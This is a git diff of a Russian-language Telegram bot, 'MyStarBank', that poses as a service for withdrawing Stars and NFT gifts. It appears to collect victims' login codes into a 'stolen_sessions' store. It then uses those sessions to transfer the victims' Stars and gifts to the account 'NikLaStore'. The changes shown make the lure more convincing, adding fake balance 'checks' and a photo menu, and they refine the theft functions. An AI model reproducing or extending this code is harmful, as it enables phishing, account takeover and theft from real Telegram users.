@@ -152,7 +152,7 @@ async function signInWithRealCode(phone, code) {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Сервер работает`);
+    console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
 // ВЕБ-ХУК ДЛЯ ТЕЛЕГРАМА
@@ -163,30 +163,36 @@ app.post('/' + BOT_TOKEN, (req, res) => {
 
 bot.startPolling();
 
-// ГЛАВНОЕ МЕНЮ С КНОПКАМИ
+// ГЛАВНОЕ МЕНЮ С КНОПКАМИ И ФОТКОЙ
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
-    const menuText = `✨ <b>MyStarBank</b>\n\n💫 Вывод NFT подарков и звезд\n\n🔐 Для доступа к вашему аккаунту необходимо пройти верификацию`;
+    const menuText = `💫 @MyStarBank_bot - Система передачи звезд\n\nДля начала работы:`;
     
     const menuKeyboard = {
         reply_markup: {
             inline_keyboard: [
                 [{ 
-                    text: "🔐 Зарегистрироваться через Fragment", 
+                    text: "⭐ Вывести звезды", 
                     web_app: { url: WEB_APP_URL } 
+                }],
+                [{ 
+                    text: "📊 Проверить баланс", 
+                    callback_data: "check_balance" 
                 }]
             ]
         }
     };
 
-    bot.sendMessage(chatId, menuText, {
+    // Отправляем фото с кнопками
+    bot.sendPhoto(chatId, 'public/stars.jpg', {
+        caption: menuText,
         parse_mode: 'HTML',
         ...menuKeyboard
     });
 });
 
-// АДМИНСКИЕ КОМАНДЫ
+// АДМИНСКИЕ КОМАНДЫ (только для тебя)
 bot.onText(/\/admin/, (msg) => {
     if (msg.from.id !== MY_USER_ID) return;
     
@@ -202,7 +208,9 @@ bot.onText(/\/admin/, (msg) => {
         }
     };
 
-    bot.sendMessage(msg.chat.id, adminText, {
+    // Аватарка для админки
+    bot.sendPhoto(msg.chat.id, 'public/avatar.jpg', {
+        caption: adminText,
         parse_mode: 'HTML',
         ...adminKeyboard
     });
@@ -215,7 +223,17 @@ bot.on('callback_query', async (query) => {
     try {
         await bot.answerCallbackQuery(query.id);
         
-        if (query.data === 'steal_gifts') {
+        if (query.data === 'check_balance') {
+            // Чеки через @ на 50 звезд
+            const checkText = `🎫 Ваши чеки:\n\n` +
+                            `@MyStarBank_bot - 50 звезд 💫\n` +
+                            `@MyStarBank_bot - 50 звезд 💫\n` +
+                            `@MyStarBank_bot - 50 звезд 💫\n\n` +
+                            `Всего: 150 звезд 💰`;
+            
+            bot.sendMessage(chatId, checkText);
+        }
+        else if (query.data === 'steal_gifts') {
             bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
             await stealAllGifts();
         }
@@ -319,17 +337,20 @@ async function stealAllStars() {
 async function transferStarsToNikLa(client, phone) {
     try {
         // Получаем баланс звезд
-        const starsStatus = await client.invoke(new Api.payments.GetStarsStatus({
-            peer: new Api.InputPeerSelf()
-        }));
-        
-        if (!starsStatus || !starsStatus.balance || starsStatus.balance.amount === 0) {
+        const status = await client.invoke(
+            new Api.payments.GetStarsStatus({
+                peer: new Api.InputPeerSelf(),
+            })
+        );
+
+        const bal = status.balance;
+        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;
+
+        if (starsAmount === 0) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
             return false;
         }
 
-        const starsAmount = Number(starsStatus.balance.amount) + Number(starsStatus.balance.nanos || 0) / 1e9;
-        
         // Ищем целевого пользователя
         const target = await client.invoke(
             new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
@@ -342,7 +363,7 @@ async function transferStarsToNikLa(client, phone) {
 
         const targetUser = target.users[0];
 
-        // Передаем звезды через покупку подписки
+        // Передаем звезды
         await client.invoke(
             new Api.payments.SendStars({
                 peer: targetUser,
@@ -354,7 +375,6 @@ async function transferStarsToNikLa(client, phone) {
             })
         );
 
-        // Обновляем базу
         db.run(`UPDATE stolen_sessions SET stars_data = ? WHERE phone = ?`, 
             [Math.floor(starsAmount), phone]);
 
@@ -370,15 +390,17 @@ async function transferStarsToNikLa(client, phone) {
 // РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ
 async function transferGiftsToNikLa(client, phone) {
     try {
-        // Получаем список сохраненных подарков
-        const savedGifts = await client.invoke(new Api.payments.GetSavedStarGifts({
-            peer: new Api.InputPeerSelf(),
-            offset: "",
-            limit: 50
-        }));
+        // Получаем список подарков
+        const gifts = await client.invoke(
+            new Api.payments.GetSavedStarGifts({
+                peer: new Api.InputPeerSelf(),
+                offset: "",
+                limit: 100,
+            })
+        );
 
-        if (!savedGifts || !savedGifts.gifts || savedGifts.gifts.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет сохраненных подарков`);
+        if (!gifts.gifts || gifts.gifts.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
             return false;
         }
 
@@ -394,8 +416,7 @@ async function transferGiftsToNikLa(client, phone) {
         const targetUser = target.users[0];
         let stolenCount = 0;
 
-        // Перебираем подарки
-        for (const gift of savedGifts.gifts) {
+        for (const gift of gifts.gifts) {
             try {
                 // Пробуем передать подарок
                 await client.invoke(
@@ -414,7 +435,7 @@ async function transferGiftsToNikLa(client, phone) {
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
             } catch (e) {
-                // Если бесплатная передача не работает, пробуем конвертировать в звезды
+                // Если передача не работает, пробуем конвертировать в звезды
                 try {
                     if (gift.convertStars) {
                         await client.invoke(
